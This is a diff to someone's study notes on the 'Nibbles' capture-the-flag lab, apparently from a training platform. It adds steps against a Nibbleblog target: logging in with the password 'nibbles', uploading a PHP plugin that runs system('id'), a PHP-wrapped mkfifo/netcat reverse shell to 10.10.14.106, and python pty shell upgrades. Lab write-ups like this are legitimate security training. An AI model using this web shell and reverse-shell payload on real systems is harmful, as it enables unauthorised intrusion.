@@ -100,8 +100,33 @@ curl -s http://10.129.4.5/nibbleblog/content/private/users.xml | xmllint  --form
 </users>
 ```
 
+
+```shell-session
+curl http://10.129.42.190/nibbleblog/README
+```
+![[Pasted image 20250207091524.png]]
+
 ![[Pasted image 20240427164635.png]]
-password nibbles from [[2Nibbles - Web Footprinting]]
+password **nibbles** from [[2Nibbles - Web Footprinting]]
 Then through plugins set up reverse shell.
+```php
+<?php system('id'); ?>
+```
+![[Pasted image 20250207092940.png]]
+
+```php
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.106 9443 >/tmp/f"); ?>
+```
+
+![[Pasted image 20250207093342.png]]
 ![[Pasted image 20240427165453.png]]
+
+For better reverse shell:
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
 ![[Pasted image 20240427170147.png]]
